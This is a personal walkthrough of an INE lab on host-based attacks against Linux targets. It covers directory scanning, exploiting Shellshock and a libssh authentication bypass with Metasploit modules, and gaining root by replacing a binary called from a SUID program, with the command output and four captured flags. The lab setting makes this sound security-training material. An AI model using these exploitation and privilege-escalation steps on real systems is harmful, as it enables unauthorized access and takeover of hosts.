System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

**This lab is designed to test your knowledge and skills in performing system/host-based attacks on Linux targets and identifying hidden information on a target machine.

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework

_______

 **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

```
└─# dirb http://target1.ine.local

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 26 21:59:32 2025
URL_BASE: http://target1.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://target1.ine.local/ ----
+ http://target1.ine.local/cgi-bin/ (CODE:403|SIZE:210)                                                                                                                            
+ http://target1.ine.local/index.html (CODE:200|SIZE:517)                                                                                                                          
==> DIRECTORY: http://target1.ine.local/static/  
```

```
sudo nmap -sC -Pn -O -sV --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local                                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 00:28 IST
Nmap scan report for target1.ine.local (192.45.23.3)
Host is up (0.000054s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
|_http-server-header: Apache/2.4.6 (Unix)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
MAC Address: 02:42:C0:2D:17:03 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/27%OT=80%CT=1%CU=39599%PV=N%DS=1%DC=D%G=Y%M=0242C
OS:0%TM=68D6E257%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%I
OS:I=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW
OS:7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7C70%W2=7C70%W3=7C70%W4=7C70%W5=7C70
OS:%W6=7C70)ECN(R=Y%DF=Y%T=40%W=7D78%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.62 seconds
```

now we know target1.ine.local is vulnarable to shellshock

so "use auxiliary/scanner/http/apache_mod_cgi_bash_env"

set RHOSTS 

exploit

we get meterpreter shell

shell 

/bin/bash -i

```
daemon@target1:/$ cat flag.txt
cat flag.txt
FLAG1_1522188ffa7b447783096116afee7dd3
```

__________

- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

```
daemon@target1:/opt/apache/htdocs$ cat .flag.txt
cat .flag.txt
FLAG2_52f206beec644198b313627a4bbce8a2
```

_____________

**Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

we know target2.ine.local vuln to `libssh_auth_bypass`

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set CMD cat /home/user/flag.txt
CMD => cat /home/user/flag.txt
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run

```
[*] 192.45.23.4:22 - Attempting authentication bypass
[*] Attempting "Execute" Action, see "show actions" for more details
[*] 192.45.23.4:22 - Executed: cat /home/user/flag.txt
FLAG3_91a2718367464369aa08f59b00b5dab0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

_____________

 **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

```
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > exploit

[*] 192.45.23.4:22 - Attempting authentication bypass
[*] Attempting "Shell" Action, see "show actions" for more details
[*] Command shell session 1 opened (192.45.23.2:43787 -> 192.45.23.4:22) at 2025-09-27 00:00:02 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions

Active sessions
===============

  Id  Name  Type   Information                                                  Connection
  --  ----  ----   -----------                                                  ----------
  1         shell  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.45.23.2:43787 -> 192.45.23.4:22 (192.45.23.4)

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -i 1

```

**NOW we have meterpreter shell

**so cd /home/user/

**then ls -la 

**it found SUID Binary

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
[*] Starting interaction with 1...


Shell Banner:
_[?2004hsh-5.2$
-----
          

sh-5.2$ cd /home
cd /home
sh-5.2$ ls
ls
temp  user
sh-5.2$ cd user
cd user
sh-5.2$ ls
ls
flag.txt  greetings  welcome
sh-5.2$ ls -la
ls -la
total 56
drwx------ 1 user user 4096 Sep 26 16:21 .
drwxr-xr-x 1 root root 4096 Nov 14  2024 ..
-rw-r--r-- 1 user user   21 Sep 24  2024 .bash_logout
-rw-r--r-- 1 user user   57 Sep 24  2024 .bash_profile
-rw-r--r-- 1 user user  172 Sep 24  2024 .bashrc
drwxr-xr-x 2 user user 4096 Nov 14  2024 .ssh
-rw-r--r-- 1 root root   39 Sep 26 16:21 flag.txt
-rwx------ 1 root root 8296 Jun 11  2024 greetings
-rwsr-xr-x 1 root root 8344 Jun 11  2024 welcome
sh-5.2$ strings welcome 
strings weelcome
strings: 'weelcome': No such file
sh-5.2$ strings welcome
strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings
;*3$"
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
welcome.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
sh-5.2$ rm greeting  
rm greeting
rm: cannot remove 'greeting': No such file or directory
sh-5.2$ ls
ls
flag.txt  greetings  welcome
sh-5.2$ rm greetings
rm greetings
rm: remove write-protected regular file 'greetings'? y
y
sh-5.2$ cp /bin/bash greetings
cp /bin/bash greetings
sh-5.2$ ./welcome
./welcome
[root@target2 ~]# ls
ls
flag.txt  greetings  welcome
[root@target2 ~]# cd /root
cd /root
[root@target2 root]# ls
ls
flag.txt
[root@target2 root]# cat flag.txt
cat flag.txt
FLAG4_665200816e5d47d684dd881b1cc79edd
[root@target2 root]# 

```

